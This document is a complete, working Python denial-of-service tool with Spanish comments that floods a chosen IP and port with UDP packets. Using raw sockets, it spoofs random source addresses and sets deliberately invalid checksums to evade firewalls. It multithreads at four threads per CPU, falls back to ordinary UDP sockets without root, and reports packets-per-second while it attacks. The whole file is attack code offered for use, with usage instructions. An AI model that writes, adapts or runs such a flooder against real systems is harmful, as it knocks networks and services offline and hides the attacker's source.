#!/usr/bin/env python3
import socket
import struct
import random
import sys
import time
import threading
import os

class UDPBadChecksum:
    """UDP with Non-Standard Checksums - Paquetes UDP con checksums inválidos"""
    
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.total_packets = 0
        self.lock = threading.Lock()
        
        # Valores de checksum no estándar
        self.bad_checksums = [
            0xFFFF,  # Checksum máximo
            0x0000,  # Checksum cero (a veces ignorado)
            0xDEAD,
            0xBEEF,
            0xCAFE,
            0x1234,
            0x5678,
            0x9ABC,
            0xDEF0,
        ]
        
    def get_cpu_count(self):
        try:
            return os.cpu_count() * 4
        except:
            return 16
    
    def create_udp_packet_bad_checksum(self):
        """Crear paquete UDP con checksum inválido"""
        # IP Header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 8 + 1400  # IP + UDP + data
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0  # IP checksum normal
        ip_saddr = socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        ip_daddr = socket.inet_aton(self.target_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
            ip_saddr, ip_daddr)
        
        # UDP Header con checksum inválido
        udp_src = random.randint(1024, 65535)
        udp_dst = self.target_port
        udp_len = 8 + 1400
        udp_check = random.choice(self.bad_checksums)  # Checksum inválido
        
        udp_header = struct.pack('!HHHH', udp_src, udp_dst, udp_len, udp_check)
        
        # Datos grandes
        data = random._urandom(1400)
        
        return ip_header + udp_header + data
    
    def udp_bad_checksum_worker(self, worker_id):
        """Worker para enviar paquetes UDP con checksums inválidos"""
        end_time = time.time() + self.duration
        packet_count = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"[!] Worker {worker_id}: Se necesita root")
            return
        
        sock.setblocking(False)
        
        # Pre-generar algunos checksums para velocidad
        local_checksums = self.bad_checksums * 10
        
        while time.time() < end_time and self.running:
            for _ in range(5000):
                if time.time() >= end_time:
                    break
                
                try:
                    packet = self.create_udp_packet_bad_checksum()
                    sock.sendto(packet, (self.target_ip, 0))
                    packet_count += 1
                except:
                    continue
            
            with self.lock:
                self.total_packets += packet_count
            packet_count = 0
            
            time.sleep(0.0001)
        
        sock.close()
    
    def udp_bad_checksum_normal(self, worker_id):
        """Worker con socket UDP normal (no puede modificar checksum)"""
        end_time = time.time() + self.duration
        
        # Múltiples sockets
        sockets = []
        for _ in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                sockets.append(sock)
            except:
                pass
        
        packet_count = 0
        
        while time.time() < end_time and self.running:
            for sock in sockets:
                for _ in range(50):
                    if time.time() >= end_time:
                        break
                    
                    try:
                        # UDP normal (checksum lo pone el sistema)
                        data = random._urandom(random.randint(500, 1400))
                        sock.sendto(data, (self.target_ip, self.target_port))
                        packet_count += 1
                    except:
                        pass
            
            if packet_count >= 10000:
                with self.lock:
                    self.total_packets += packet_count
                packet_count = 0
    
    def start_attack(self):
        num_threads = self.get_cpu_count()
        
        print(f"[🧮] UDP BAD CHECKSUM FLOOD")
        print(f"[🎯] Target: {self.target_ip}:{self.target_port}")
        print(f"[⏱️] Duration: {self.duration}s")
        print(f"[🧵] Threads: {num_threads}")
        print(f"[🔢] Checksums inválidos: {self.bad_checksums}")
        print(f"[⚡] Confundiendo firewalls con checksums no estándar")
        
        # Detectar root
        try:
            test = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            test.close()
            use_raw = True
            print(f"[✅] Usando raw sockets (checksums modificados)")
            worker = self.udp_bad_checksum_worker
        except:
            use_raw = False
            print(f"[⚠️] Usando UDP normal (sin modificar checksums)")
            print(f"[ℹ️] Para checksums inválidos: ejecutar con sudo")
            worker = self.udp_bad_checksum_normal
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor
        start = time.time()
        last = 0
        
        while time.time() - start < self.duration:
            time.sleep(1)
            with self.lock:
                current = self.total_packets
                rate = current - last
                last = current
            
            print(f"\r[📊] {int(time.time()-start)}s | Paquetes: {current:,} | {rate:,} pps", end="")
        
        self.running = False
        
        with self.lock:
            final = self.total_packets
        
        print(f"\n\n[✅] UDP Bad Checksum Flood completado")
        print(f"[📊] Total paquetes: {final:,}")
        print(f"[📊] Checksums usados: {self.bad_checksums}")
        if use_raw:
            print(f"[🔥] Enviados con checksums inválidos")

def main():
    if len(sys.argv) != 4:
        print("Uso: sudo python3 udpbad.py <ip> <port> <time>")
        print("      python3 udpbad.py <ip> <port> <time> (UDP normal)")
        print("Ejemplo: sudo python3 udpbad.py 192.168.1.1 80 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    attack = UDPBadChecksum(target_ip, target_port, duration)
    attack.start_attack()

if __name__ == "__main__":
    main()
